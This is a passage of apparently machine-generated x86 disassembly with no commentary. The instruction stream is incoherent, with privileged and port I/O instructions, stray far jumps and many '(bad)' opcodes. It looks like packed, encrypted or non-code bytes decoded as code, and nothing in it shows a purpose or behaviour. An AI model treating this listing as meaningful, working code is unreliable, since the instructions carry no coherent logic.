  4090bf:	out    0x61,eax
  4090c1:	xor    esi,DWORD PTR [ecx+eiz*8+0x7cb7915e]
  4090c8:	outs   dx,BYTE PTR ds:[esi]
  4090c9:	sbb    ch,dh
  4090cb:	not    DWORD PTR [edi+ebp*2-0x5d9c2608]
  4090d2:	mov    ah,0x63
  4090d4:	popf   
  4090d5:	or     DWORD PTR [edx+0x7d002135],esi
  4090db:	dec    ebx
  4090dc:	mov    eax,0x47c0a449
  4090e1:	pop    ss
  4090e2:	push   eax
  4090e3:	fwait
  4090e4:	mov    bh,0xfa
  4090e6:	push   ecx
  4090e7:	ss cs gs inc edi
  4090eb:	mov    ebx,0xbb2481a5
  4090f0:	dec    edx
  4090f1:	push   ss
  4090f2:	aad    0xc8
  4090f4:	xor    al,0x45
  4090f6:	fisubr WORD PTR [edi+0x664bb013]
  4090fc:	jmp    0xd5a8:0x9c1b49f0
  409103:	sub    bl,BYTE PTR [ebp-0x3c09c971]
  409109:	mov    esp,0x2f48f1f6
  40910e:	nop
  40910f:	ficom  WORD PTR ds:0x4a28a403
  409115:	stc    
  409116:	push   ebx
  409117:	mov    ecx,0xde6d75dd
  40911c:	jl     0x409100
  40911e:	inc    edx
  40911f:	arpl   WORD PTR [esp+edi*4+0xf],cx
  409123:	cs pop ebp
  409125:	cmp    eax,0x24772c03
  40912a:	cmp    BYTE PTR [edx],dl
  40912c:	add    DWORD PTR [esi+edx*2-0x2400f859],0x4b543ea7
  409137:	jge    0x4090e2
  409139:	sysret 
  40913b:	js     0x409198
  40913d:	repz sub DWORD PTR [edi],0x55ef3573
  409144:	sbb    eax,0xe43eee56
  409149:	sub    al,0x74
  40914b:	scas   eax,DWORD PTR es:[edi]
  40914c:	push   cs
  40914d:	xchg   ebp,eax
  40914e:	pop    ecx
  40914f:	or     al,0xb0
  409151:	dec    edi
  409152:	xor    dh,dl
  409154:	mov    edi,0xd616eadf
  409159:	xlat   BYTE PTR ds:[ebx]
  40915a:	mov    ah,0xbc
  40915c:	int    0x95
  40915e:	mov    ds:0x5eb06c6d,al
  409163:	mov    eax,0x21d94ad2
  409168:	mov    eax,ds:0x18d57469
  40916d:	loope  0x409132
  40916f:	add    BYTE PTR [ebp+0x71],bl
  409172:	pop    edi
  409173:	cli    
  409174:	shl    BYTE PTR [esp+ecx*2+0x3888530e],1
  40917b:	retf   0xa4cd
  40917e:	pop    ebp
  40917f:	sar    BYTE PTR [ecx],cl
  409181:	nop
  409182:	pop    ebp
  409183:	cwde   
  409184:	and    esi,DWORD PTR [edi]
  409186:	lods   al,BYTE PTR ds:[esi]
  409187:	xchg   edx,eax
  409188:	inc    ecx
  409189:	lock jno 0x409166
  40918c:	push   0xfa55c7c4
  409191:	sub    eax,0x241f2b9e
  409196:	push   eax
  409197:	stos   DWORD PTR es:[edi],eax
  409198:	(bad)  
  409199:	pop    eax
  40919a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40919b:	pop    ebx
  40919c:	and    cl,BYTE PTR [ebx+ecx*4+0x57625116]
  4091a3:	xlat   BYTE PTR ds:[ebx]
  4091a4:	xchg   DWORD PTR [eax-0xcdd23ee],edi
  4091aa:	adc    BYTE PTR [edi+0x65],ah
  4091ad:	fs nop
  4091af:	pushf  
  4091b0:	sbb    DWORD PTR [ebp-0x3b],esi
  4091b3:	adc    eax,0x5c8c2c97
  4091b8:	or     eax,0xa42b02fa
  4091bd:	mov    ah,0x7f
  4091bf:	mov    eax,0x671e5d17
  4091c4:	mov    ds:0x18386a89,eax
  4091c9:	test   al,0xa6
  4091cb:	pop    eax
  4091cc:	les    edi,FWORD PTR [ebp+0x31]
  4091cf:	inc    edx
  4091d0:	or     BYTE PTR [edx-0x561287],0xce
  4091d7:	jno    0x4091f9
  4091d9:	cmp    ebx,DWORD PTR [ebp-0x59f6728e]
  4091df:	icebp  
  4091e0:	mov    eax,ds:0x72f1d59d
  4091e5:	scas   al,BYTE PTR es:[edi]
  4091e6:	out    dx,eax
  4091e7:	retf   
  4091e8:	jb     0x409232
  4091ea:	sub    DWORD PTR [ebx+0x63],ecx
  4091ed:	stos   DWORD PTR es:[edi],eax
  4091ee:	mov    esi,0xed7a9996
  4091f3:	mov    bh,0x5a
  4091f5:	repz add esi,DWORD PTR [ecx+0x50]
  4091f9:	loopne 0x409237
  4091fb:	sar    BYTE PTR [ecx],1
  4091fd:	pop    ds
  4091fe:	xlat   BYTE PTR ds:[ebx]
  4091ff:	mov    DWORD PTR [ebx],ebx
  409201:	jae    0x4091f7
  409203:	mov    eax,ds:0x23e684ab
  409208:	test   BYTE PTR [edx+0x3d],dh
  40920b:	cld    
  40920c:	push   edx
  40920d:	inc    eax
  40920e:	ss retf 0x4a75
  409212:	dec    ebp
  409213:	jbe    0x409277
  409215:	mov    ebp,0x4720b4a4
  40921a:	leave  
  40921b:	enter  0x6969,0x10
  40921f:	ss pmaddwd mm6,mm6
  409223:	cmc    
  409224:	int    0x58
  409226:	and    DWORD PTR [edi+ebp*4-0x4d],ebx
  40922a:	rcr    BYTE PTR [edx*4-0xddca074],0xf1
  409232:	cs add al,0xa8
  409235:	in     al,0xbf
  409237:	(bad)  
  409238:	bound  ecx,QWORD PTR ds:0xa07f81
  40923e:	pop    ss
  40923f:	in     eax,0xac
  409241:	in     eax,0xf4
  409243:	loopne 0x409256
  409245:	push   ecx
  409246:	ss scas eax,DWORD PTR es:[edi]
  409248:	cmp    ah,BYTE PTR [ebx+0x79]
  40924b:	test   DWORD PTR [ebx+edx*2],0x84ff09be
  409252:	repz ret 
  409254:	jl     0x4091e3
  409256:	or     BYTE PTR [ebx*1-0x2454c14d],0x17
  40925e:	sbb    esp,eax
  409260:	cld    
  409261:	add    eax,0x188d1a09
  409266:	push   ebx
  409267:	ja     0x40924e
  409269:	retf   
  40926a:	inc    esi
  40926b:	cmp    ecx,DWORD PTR [eax]
  40926d:	ficomp WORD PTR ds:0x65757f36
  409273:	adc    DWORD PTR [ebx+0x74d5c00a],eax
  409279:	sbb    esp,DWORD PTR [ecx-0x432fbc24]
  40927f:	xchg   ebp,eax
  409280:	scas   eax,DWORD PTR es:[edi]
  409281:	jnp    0x40921f
  409283:	aaa    
  409284:	leave  
  409285:	pop    edx
  409286:	jge    0x40926c
  409288:	dec    BYTE PTR [ecx]
  40928a:	jg     0x409248
  40928c:	sbb    edx,DWORD PTR ds:0x628439a2
  409292:	pop    edx
  409293:	cmp    esp,DWORD PTR [edi-0x1b]
  409296:	js     0x409246
  409298:	fwait
  409299:	pop    esp
  40929a:	cmp    DWORD PTR [ebx-0x7c],esi
  40929d:	pop    ebx
  40929e:	cld    
  40929f:	cwde   
  4092a0:	jg     0x4092d8
  4092a2:	pushf  
  4092a3:	xor    BYTE PTR [ebx+0x0],dl
  4092a6:	scas   eax,DWORD PTR es:[edi]
  4092a7:	push   0xffffffd1
  4092a9:	les    ecx,FWORD PTR [ebp+0x60]
  4092ac:	dec    ebx
  4092ad:	jmp    0x4382:0xbf11e69c
  4092b4:	addr16 adc ecx,esi
  4092b7:	jae    0x40932e
  4092b9:	mov    eax,ds:0xf6453867
  4092be:	bound  esi,QWORD PTR [eax]
  4092c0:	pop    esp
  4092c1:	imul   ebp,DWORD PTR [edi+0x2c],0xffffff9e
  4092c5:	mov    BYTE PTR [edi-0x74],cl
  4092c8:	adc    esp,edi
  4092ca:	jp     0x4092f7
  4092cc:	mov    ebp,0x20cc8ac0
  4092d1:	xchg   ecx,eax
  4092d2:	fisub  DWORD PTR [ebx-0x73]
  4092d5:	mov    cl,0x85
  4092d7:	out    0x5b,eax
  4092d9:	test   al,bh
  4092db:	scas   al,BYTE PTR es:[edi]
  4092dc:	je     0x409305
  4092de:	adc    edi,DWORD PTR [edi+0xe]
  4092e1:	outs   dx,BYTE PTR ds:[esi]
  4092e2:	arpl   di,sp
  4092e4:	stc    
  4092e5:	bound  esp,QWORD PTR [esi+edi*4+0x5208a503]
  4092ec:	mov    al,ds:0x62853859
  4092f1:	pop    eax
  4092f2:	pushf  
  4092f3:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092f5:	push   0xffffffda
  4092f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092f8:	pop    edx
  4092f9:	jle    0x409347
  4092fb:	in     eax,dx
  4092fc:	rcl    BYTE PTR [esi],cl
  4092fe:	jmp    0xc16f165a
  409303:	push   cs
  409304:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409305:	cmc    
  409306:	jge    0x409330
  409308:	outs   dx,BYTE PTR ds:[esi]
  409309:	adc    al,0xfc
  40930b:	shr    ebx,0x6
  40930e:	out    0xd1,al
  409310:	scas   al,BYTE PTR es:[edi]
  409311:	(bad)  [ecx-0x4e]
  409314:	jnp    0x409341
  409316:	ret    0xcd29
  409319:	sbb    eax,0x6b5293bc
  40931e:	daa    
  40931f:	and    ebx,DWORD PTR [esi-0x68391bf9]
  409325:	jmp    0x409394
  409327:	add    BYTE PTR [ebp-0x5d],0xb6
  40932b:	inc    edi
  40932c:	sub    bh,bl
  40932e:	xor    BYTE PTR [edx-0x60],dh
  409331:	push   cs
  409332:	out    dx,eax
  409333:	jmp    0xefc53062
  409338:	dec    esp
  409339:	add    ebx,DWORD PTR [eax]
  40933b:	inc    ebx
  40933c:	out    dx,al
  40933d:	out    dx,al
  40933e:	push   ds
  40933f:	xchg   ecx,eax
  409340:	inc    eax
  409341:	jb     0x409357
  409343:	mov    ah,0x1
  409345:	dec    cx
  409347:	jmp    0x399ce77a
  40934c:	pushf  
  40934d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40934e:	xchg   ecx,eax
  40934f:	(bad)  
  409350:	push   ecx
  409351:	jno    0x409333
  409353:	mov    al,0xd1
  409355:	aad    0x68
  409357:	xchg   DWORD PTR [ebp-0x6d],esp
  40935a:	cmc    
  40935b:	cld    
  40935c:	out    dx,eax
  40935d:	lds    ebp,FWORD PTR [ebx+0x45acd9a0]
  409363:	and    al,0xa2
  409365:	pop    edi
  409366:	mov    cs,WORD PTR [eax+0x2e]
  409369:	or     BYTE PTR [ebp-0x3ef9562f],dl
  40936f:	adc    eax,0x1ba17bc7
  409374:	pop    ecx
  409375:	pop    ss
  409376:	mov    esp,0x2e494867
  40937b:	shr    DWORD PTR [esi-0x66d732c4],cl
  409381:	ret    0x8d5
  409384:	inc    esp
  409385:	aas    
  409386:	(bad)  
  409387:	jg     0x4093b0
  409389:	outs   dx,DWORD PTR ds:[esi]
  40938a:	lods   al,BYTE PTR ds:[esi]
  40938b:	daa    
  40938c:	jnp    0x409352
  40938e:	stos   BYTE PTR es:[edi],al
  40938f:	pusha  
  409390:	pop    ebp
  409391:	outs   dx,DWORD PTR ds:[esi]
  409392:	lahf   
  409393:	test   al,0x5b
  409395:	call   0x2c30:0xa9fff246
  40939c:	adc    BYTE PTR [edx-0x3906cfda],dl
  4093a2:	xor    eax,0xab1a3566
  4093a7:	xor    eax,0x5302dfcb
  4093ac:	push   0x69655d5a
  4093b1:	or     al,0x6f
  4093b3:	imul   esp,DWORD PTR [edi],0x63b4bf62
  4093b9:	mov    ch,0xd9
  4093bb:	mov    ebx,0x26d98c09
  4093c0:	inc    esi
  4093c1:	pop    edx
  4093c2:	xchg   DWORD PTR ds:0x634433c3,esp
  4093c8:	out    dx,al
  4093c9:	mov    cl,ah
  4093cb:	loopne 0x4093d1
  4093cd:	adc    al,0x79
  4093cf:	push   esp
  4093d0:	mov    dh,0xbc
  4093d2:	(bad)  
  4093d3:	repnz call 0x4f00:0xd837375e
  4093db:	add    DWORD PTR [edx],edx
  4093dd:	arpl   WORD PTR [esi+0x1a],bx
  4093e0:	lods   al,BYTE PTR ds:[esi]
  4093e1:	sbb    BYTE PTR [eax+0x78316a60],al
  4093e7:	in     eax,dx
  4093e8:	sahf   
  4093e9:	call   0xf64dffd
  4093ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4093ef:	add    al,BYTE PTR [esi-0x4adc2941]
  4093f5:	jl     0x4093f6
  4093f7:	test   eax,0xe2a3961a
  4093fc:	in     eax,0x1a
  4093fe:	mov    ch,0x9a
  409400:	icebp  
  409401:	xchg   ecx,eax
  409402:	cmp    eax,ebp
  409404:	or     edi,edi
  409406:	daa    
  409407:	bound  eax,QWORD PTR [eax+0x71]
  40940a:	rcr    BYTE PTR [edi+0x3c32cdcf],1
  409410:	xor    ebx,edx
  409412:	mov    ch,BYTE PTR [ebx]
  409414:	out    dx,al
  409415:	xor    al,BYTE PTR [ebx-0x74bc1d34]
  40941b:	adc    eax,0xaf763593
  409420:	dec    esp
  409421:	cwde   
  409422:	or     edi,ebp
  409424:	repnz add ah,BYTE PTR [ebx]
  409427:	repz lahf 
  409429:	out    0x98,eax
  40942b:	inc    ebp
  40942c:	in     al,dx
  40942d:	(bad)  
  40942e:	loop   0x409417
  409430:	push   es
  409431:	xor    BYTE PTR [ebp-0x5efd89a2],bl
  409437:	imul   eax,DWORD PTR [edi+0x3c8ff6f5],0xffffff97
  40943e:	dec    esi
  40943f:	push   edx
  409440:	mov    al,ds:0x19b99aff
  409445:	pop    edi
  409446:	pop    es
  409447:	mov    esi,0x2e83fc6d
  40944c:	xchg   ebp,eax
  40944d:	push   ebp
  40944e:	retf   
  40944f:	sbb    eax,0xbf1e430
  409454:	rcr    DWORD PTR [ebp+0x60c9c53b],1
  40945a:	cwde   
  40945b:	push   ss
  40945c:	and    BYTE PTR [eax-0x38],cl
  40945f:	cwde   
  409460:	mov    edx,es
  409462:	stos   BYTE PTR es:[edi],al
  409463:	push   es
  409464:	adc    DWORD PTR [eax+0x60],ecx
  409467:	adc    cl,BYTE PTR [edi+0xc2a94aa]
  40946d:	ins    BYTE PTR es:[edi],dx
  40946e:	mov    cl,0xd3
  409470:	xor    BYTE PTR [ebx+0x5d],bl
  409473:	and    DWORD PTR [eax+0x2b7e94f],edx
  409479:	retf   
  40947a:	jnp    0x4094b6
  40947c:	xchg   edx,eax
  40947d:	xchg   ebp,eax
  40947e:	jmp    0x409469
  409480:	imul   edx,DWORD PTR [esi],0xffffff96
  409483:	push   ds
  409484:	shl    bl,0xbd
  409487:	and    al,0x63
  409489:	push   ebx
  40948a:	mov    eax,ebp
  40948c:	or     al,0xa6
  40948e:	out    dx,al
  40948f:	test   al,0x96
  409491:	in     al,dx
  409492:	sbb    BYTE PTR [esi-0x7aba5eb8],0x9f
  409499:	stos   BYTE PTR es:[edi],al
  40949a:	inc    eax
  40949b:	push   ss
  40949c:	mov    edx,esp
  40949e:	and    esi,DWORD PTR [ecx]
  4094a0:	adc    edx,DWORD PTR [ebp-0x38]
  4094a3:	or     DWORD PTR [ebx+0x71],esp
  4094a6:	mov    al,0x35
  4094a8:	dec    ebp
  4094a9:	pushf  
  4094aa:	mov    dl,0xb
  4094ac:	jl     0x4094d5
  4094ae:	mov    dh,dh
  4094b0:	cmc    
  4094b1:	mov    esp,0x3222d305
  4094b6:	addr16 inc esi
  4094b8:	test   DWORD PTR [eax+0x2e034cb5],ebx
  4094be:	mov    dl,0x26
  4094c0:	mov    bl,BYTE PTR [edi-0x56069e8a]
  4094c6:	push   edx
  4094c7:	and    BYTE PTR ds:0xe650c419,ch
  4094cd:	mov    WORD PTR [edi+0xd241abd],ds
  4094d3:	pusha  
  4094d4:	dec    edx
  4094d5:	int3   
  4094d6:	nop
  4094d7:	fstp   st(0)
  4094d9:	inc    ebx
  4094da:	fs mov ecx,0xed64a8f5
  4094e0:	lods   al,BYTE PTR ds:[esi]
  4094e1:	or     DWORD PTR [edi+eax*8],ebx
  4094e4:	xchg   ecx,eax
  4094e5:	sbb    eax,DWORD PTR [ebx+0x1b]
  4094e8:	add    esp,DWORD PTR [ebp+0x3d]
  4094eb:	cmp    eax,0x76a8068e
  4094f0:	popf   
  4094f1:	aaa    
  4094f2:	out    0x11,eax
  4094f4:	je     0x4094f9
  4094f6:	in     al,dx
  4094f7:	jecxz  0x409488
  4094f9:	sub    edx,edx
  4094fb:	outs   dx,BYTE PTR ds:[esi]
  4094fc:	pop    edx
  4094fd:	shl    DWORD PTR [ebx],1
  4094ff:	mov    ebx,0x49b2a15b
  409504:	inc    esp
  409505:	and    BYTE PTR [esi],0xdd
  409508:	sar    DWORD PTR [edi-0x7],1
  40950b:	pop    edi
  40950c:	xchg   ecx,eax
  40950d:	pop    ds
  40950e:	fdiv   st(2),st
  409510:	(bad)  
  409511:	push   cs
  409512:	mov    eax,0xd96e63c0
  409517:	jle    0x40956f
  409519:	cmp    bl,bh
  40951b:	arpl   WORD PTR [ebx-0xc459c2e],bx
  409521:	push   edx
  409522:	pop    esp
  409523:	aaa    
  409524:	cdq    
  409525:	adc    al,0xa1
  409527:	sbb    BYTE PTR [edi-0x3e],0xbd
  40952b:	adc    DWORD PTR [ebp+0x128342a4],edi
  409531:	mov    al,ds:0xa332fe8b
  409536:	es and eax,0xde1b0cb7
  40953c:	mov    DWORD PTR [ebx-0x7a],esi
  40953f:	int3   
  409540:	xchg   ecx,eax
  409541:	mov    ah,0x8a
  409543:	or     esp,DWORD PTR [eax+0x29]
  409546:	xor    eax,0x7550088e
  40954b:	fsub   QWORD PTR [ecx]
  40954d:	dec    esi
  40954e:	sbb    DWORD PTR [eax-0x22],ecx
  409551:	scas   al,BYTE PTR es:[edi]
  409552:	call   0xe22b5766
  409557:	add    bl,BYTE PTR [ecx]
  409559:	arpl   WORD PTR [edi-0x3e7b3a69],bx
  40955f:	out    0xc4,eax
  409561:	xor    DWORD PTR [ebx+eax*1-0x73],esp
  409565:	xchg   ebx,eax
  409566:	sub    al,BYTE PTR [ebx+0xae956a2]
  40956c:	mov    bl,0x5a
  40956e:	dec    edx
  40956f:	gs cs stos BYTE PTR es:[edi],al
  409572:	adc    eax,0xd72a05f7
  409577:	xlat   BYTE PTR ds:[ebx]
  409578:	jg     0x40952a
  40957a:	bound  edi,QWORD PTR [eax]
  40957c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40957d:	(bad)  
  40957e:	in     al,dx
  40957f:	add    al,0xfe
  409581:	push   esi
  409582:	pop    esi
  409583:	xchg   BYTE PTR [ebx-0x3096a364],al
  409589:	add    al,0x5c
  40958b:	jp     0x409533
  40958d:	add    al,0xfa
  40958f:	(bad)  
  409591:	mov    ah,0x9a
  409593:	leave  
  409594:	test   DWORD PTR [esi],eax
  409596:	ja     0x4095c0
  409598:	jo     0x4095c8
  40959a:	inc    edi
  40959b:	jecxz  0x40952e
  40959d:	ins    DWORD PTR es:[edi],dx
  40959e:	inc    ebp
  40959f:	sub    al,0xc3
  4095a1:	mov    ebp,0xb1ecd425
  4095a6:	aaa    
  4095a7:	dec    ebx
  4095a8:	or     BYTE PTR [ecx+0x2909fb56],bl
  4095ae:	jge    0x409595
  4095b0:	inc    esp
  4095b1:	fnstsw WORD PTR [eax-0x16]
  4095b4:	push   es
  4095b5:	jle    0x4095b4
  4095b7:	sbb    eax,0x1898c1e0
  4095bc:	cmp    DWORD PTR [eax+0x39],eax
  4095bf:	sbb    ah,bh
  4095c1:	jle    0x409637
  4095c3:	push   eax
  4095c4:	push   ebx
  4095c5:	clc    
  4095c6:	test   al,0x46
  4095c8:	cld    
  4095c9:	sbb    BYTE PTR [ebx-0x2b],bl
  4095cc:	ja     0x409562
  4095ce:	jl     0x409568
  4095d0:	jecxz  0x4095dd
  4095d2:	enter  0xdded,0xb8
  4095d6:	ja     0x4095cd
  4095d8:	inc    edx
  4095d9:	shr    BYTE PTR [ecx],1
  4095db:	ret    0xa60b
  4095de:	or     BYTE PTR [edx],0x31
  4095e1:	add    dl,BYTE PTR [eax-0x56aa4a3]
  4095e7:	inc    edx
  4095e8:	add    ch,cl
  4095ea:	ja     0x4095e2
  4095ec:	xchg   esi,eax
  4095ed:	loopne 0x409617
  4095ef:	cmp    al,0x50
  4095f1:	ja     0x4095c8
  4095f3:	mov    WORD PTR [eax-0x61],cs
  4095f6:	out    dx,al
  4095f7:	push   edi
  4095f8:	jno    0x4095d7
  4095fa:	dec    esi
  4095fb:	push   eax
  4095fc:	popf   
  4095fd:	push   ecx
  4095fe:	push   ds
  4095ff:	sub    eax,0x1c7406e5
  409604:	ret    0xcd7a
  409607:	adc    eax,0x4933c6e
  40960c:	(bad)
  409610:	int    0x73
  409612:	sbb    eax,DWORD PTR [ebp+0x34]
  409615:	sbb    DWORD PTR [ebp*2+0x1c3bbda1],edx
  40961c:	rcr    BYTE PTR [ebx+0x63],cl
  40961f:	test   esp,esp
  409621:	in     al,dx
  409622:	mov    dh,0xac
  409624:	(bad)  
  409625:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409626:	in     al,0x3
  409628:	je     0x409659
  40962a:	cli    
  40962b:	add    al,bl
  40962d:	ds inc edi
  40962f:	nop
  409630:	dec    ecx
  409631:	and    bh,ah
  409633:	push   ss
  409634:	xchg   esi,eax
  409635:	ret    
  409636:	js     0x4095f1
  409638:	dec    edi
  409639:	push   0xb4701604
  40963e:	rcr    DWORD PTR [edx+0x44f60137],0xe0
  409645:	popf   
  409646:	out    0x6f,eax
  409648:	xor    al,0x68
  40964a:	lahf   
  40964b:	ret    
  40964c:	clc    
  40964d:	fcom   st(1)
  40964f:	aad    0x75
  409651:	push   0x993ce4b5
  409656:	mov    bl,0x91
  409658:	js     0x409616
  40965a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40965b:	out    dx,eax
  40965c:	jecxz  0x409645
  40965e:	fmul   DWORD PTR [ebx+0x13df6ade]
  409664:	dec    ebp
  409665:	sub    eax,0x2209b312
  40966a:	out    0xf3,eax
  40966c:	xor    BYTE PTR [esi-0x66ac75b4],0x2a
  409673:	dec    ecx
  409674:	mov    BYTE PTR [eax+0x5c],cl
  409677:	sbb    eax,0x7dc3ece1
  40967c:	pop    esi
  40967d:	lods   eax,DWORD PTR ds:[esi]
  40967e:	adc    eax,0xa1ae01c5
  409683:	xchg   ebp,eax
  409684:	sbb    DWORD PTR [edi-0x1ad00f9c],edx
  40968a:	arpl   cx,sp
  40968c:	fcom   QWORD PTR [ebx]
  40968e:	push   ds
  40968f:	in     eax,dx
  409690:	std    
  409691:	push   ecx
  409692:	cmp    al,0x5b
  409694:	out    dx,al
  409695:	hlt    
  409696:	xchg   ebx,eax
  409697:	mov    bl,al
  409699:	in     eax,dx
  40969a:	xchg   esi,eax
  40969b:	retf   
  40969c:	mov    cl,0xad
  40969e:	mov    ah,0x9c
  4096a0:	imul   eax,DWORD PTR [esi+0x7954a08],0xffffffa6
  4096a7:	dec    ecx
  4096a8:	jns    0x409663
  4096aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4096ab:	out    dx,al
  4096ac:	mov    cl,dl
  4096ae:	pushw  0xf
  4096b1:	lods   eax,DWORD PTR ds:[esi]
  4096b2:	call   0x2f26276f
  4096b7:	xchg   esp,eax
  4096b8:	jo     0x40965c
  4096ba:	or     DWORD PTR [edi],edi
  4096bc:	aas    
  4096bd:	pop    edi
  4096be:	iret   
  4096bf:	pop    sp
  4096c1:	push   ebp
  4096c2:	ja     0x40973e
  4096c4:	jb     0x4096f2
  4096c6:	(bad)  
  4096c7:	mov    bl,0x38
  4096c9:	add    bl,BYTE PTR [edx+0x67]
  4096cc:	sub    al,0xc5
  4096ce:	jo     0x40974c
  4096d0:	(bad)  
  4096d1:	jne    0x4096ea
  4096d3:	pop    edx
  4096d5:	(bad)  
  4096d6:	or     DWORD PTR [ecx+edx*4-0x6e],esi
  4096da:	mov    eax,ds:0xa1d0999d
  4096df:	into   
  4096e0:	push   ecx
  4096e1:	in     eax,0x53
  4096e3:	sub    DWORD PTR [ebp-0x552fff9d],ebx
  4096e9:	inc    ebp
  4096ea:	fimul  DWORD PTR [edx]
  4096ec:	inc    esp
  4096ed:	or     eax,0x98f9dfbf
  4096f2:	loopne 0x40968e
  4096f4:	pop    es
  4096f5:	pop    esi
  4096f6:	outs   dx,DWORD PTR ds:[esi]
  4096f7:	rol    BYTE PTR [edx],0x9
  4096fa:	hlt    
  4096fb:	ror    DWORD PTR [ecx+eax*4],1
  4096fe:	icebp  
  4096ff:	inc    ebp
  409700:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409701:	sub    DWORD PTR [edi-0xc],0x8f9018aa
  409708:	push   esi
  409709:	push   0x7b
  40970b:	fcomp  DWORD PTR [eax]
  40970d:	cs push ecx
  40970f:	loop   0x4096c3
  409711:	cmp    eax,0x8d4f0511
  409716:	inc    edi
  409717:	mov    bl,0x34
  409719:	dec    esi
  40971a:	xor    BYTE PTR [esi],0xc7
  40971d:	jns    0x4096c4
  40971f:	test   al,0x61
  409721:	and    ecx,DWORD PTR [edx-0x52]
  409724:	imul   ebx,DWORD PTR [esi-0x54f94ad4],0x95d6c60a
  40972e:	jecxz  0x409753
  409730:	mov    ah,0xed
  409732:	sbb    BYTE PTR [edx+0x2b],0x99
  409736:	inc    eax
  409737:	dec    edi
  409738:	(bad)  
  409739:	mov    ds:0x7fa12b25,al
  40973e:	jle    0x4097bf
  409740:	pop    esi
  409741:	mov    bl,0x5e
  409743:	ror    BYTE PTR [edx+0x4191aa16],cl
  409749:	inc    ebp
  40974a:	int    0xd5
  40974c:	in     eax,0x17
  40974e:	pop    ss
  40974f:	xor    al,BYTE PTR ds:0x6000a2fe
  409755:	inc    BYTE PTR [ebx]
  409757:	jae    0x4097ac
  409759:	inc    edi
  40975a:	int    0xb0
  40975c:	jae    0x4097c7
  40975e:	retf   0x6091
  409761:	add    eax,0xae59f633
  409766:	bnd jno 0x409775
  409769:	inc    ecx
  40976a:	add    edx,DWORD PTR [edi-0x35]
  40976d:	pop    ecx
  40976e:	inc    ebp
  40976f:	mov    edx,0xe6ecd069
  409774:	push   0xf6a33655
  409779:	mov    bh,0x93
  40977b:	xchg   edx,eax
  40977c:	inc    edx
  40977d:	or     bl,al
  40977f:	mov    eax,ds:0x67ff31e4
  409784:	sahf   
  409785:	mov    ecx,0xa649f638
  40978a:	pushf  
  40978b:	jnp    0x409732
  40978d:	jmp    0xf1e3c844
  409792:	fcmovnu st,st(6)
  409794:	cs scas eax,DWORD PTR es:[edi]
  409796:	jmp    0x14c0:0xb2e3455f
  40979d:	inc    edx
  40979e:	je     0x4097ad
  4097a0:	ss out 0x70,eax
  4097a3:	push   edi
  4097a4:	jle    0x409817
  4097a6:	mov    al,ds:0x2727323e
  4097ab:	jns    0x40978f
  4097ad:	dec    eax
  4097ae:	pusha  
  4097af:	add    ah,ah
  4097b1:	jae    0x4097c9
  4097b3:	iret   
  4097b4:	add    BYTE PTR [ecx],bl
  4097b6:	sbb    eax,0xcba33779
  4097bb:	xchg   ebx,eax
  4097bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4097bd:	sub    bl,BYTE PTR [ecx+esi*4-0x80]
  4097c1:	mov    dh,ah
  4097c3:	push   0xc3b5c3e6
  4097c8:	fwait
  4097c9:	adc    esp,DWORD PTR [edi-0x5b]
  4097cc:	inc    esi
  4097cd:	into   
  4097ce:	xor    BYTE PTR [ebx-0x2ea980a7],0xa
  4097d5:	fdiv   QWORD PTR [esp+edi*4]
  4097d8:	jns    0x40981a
  4097da:	ins    DWORD PTR es:[edi],dx
  4097db:	and    al,0x85
  4097dd:	lock jl 0x4097fe
  4097e0:	pop    esi
  4097e1:	imul   ebp,DWORD PTR [esi+0x7976d64c],0x724ec8e
  4097eb:	cld    
  4097ec:	and    bl,BYTE PTR [ebp-0x7e]
  4097ef:	fnstcw WORD PTR [ecx]
  4097f1:	add    DWORD PTR [edx+0x1e],0xfffffffb
  4097f5:	jl     0x409820
  4097f7:	pop    ds
  4097f8:	out    0x91,eax
  4097fa:	mov    al,ds:0xe6ec37ef
  4097ff:	inc    edx
  409800:	and    bl,BYTE PTR [ebp+0x6e]
  409803:	pop    eax
  409804:	aas    
  409805:	mov    BYTE PTR [esi-0x26],al
  409808:	cmp    eax,0xfbda9ed5
  40980d:	push   0x11
  40980f:	or     dh,ah
  409811:	fsubr  st(7),st
  409813:	xchg   edi,eax
  409814:	inc    esi
  409815:	push   ecx
  409816:	push   ds
  409817:	xor    bl,BYTE PTR [edx-0x62]
  40981a:	fcomp  DWORD PTR [esi*1-0x42fad130]
  409821:	adc    eax,0x8087d642
  409826:	xchg   ebx,eax
  409827:	xchg   edi,eax
  409828:	sbb    esp,esp
  40982a:	test   al,0x91
  40982c:	jmp    0x40982b
  40982e:	nop
  40982f:	fsubr  QWORD PTR [ebx+0x4724f864]
  409835:	cmp    dl,ch
  409837:	mov    al,ds:0x2e2908e5
  40983c:	adc    eax,esp
  40983e:	adc    eax,0x16924054
  409843:	xor    edx,DWORD PTR [ecx+ebp*4+0x74]
  409847:	mov    bl,0xfb
  409849:	sub    BYTE PTR [ebx-0x34e11b0d],dh
  40984f:	dec    dl
  409851:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409852:	div    DWORD PTR [ebp+0x57]
  409855:	inc    ecx
  409856:	and    ecx,DWORD PTR [ebx]
  409858:	push   esp
  409859:	ja     0x4097ff
  40985b:	call   0x14ff:0xde6c18fc
  409862:	(bad)
  409866:	mov    edi,0x93aed8ff
  40986b:	outs   dx,DWORD PTR ds:[esi]
  40986c:	out    dx,al
  40986d:	push   ds
  40986e:	sub    al,0x4f
  409870:	retf   0x96a8
  409873:	xchg   esi,eax
  409874:	and    al,0xad
  409876:	push   ebx
  409877:	ins    DWORD PTR es:[edi],dx
  409878:	mov    eax,0x181c8e9d
  40987d:	sub    ch,BYTE PTR [edi+0x53396ba3]
  409883:	or     dl,ch
  409885:	mov    ebp,0x362e8375
  40988a:	xlat   BYTE PTR ds:[ebx]
  40988b:	push   ds
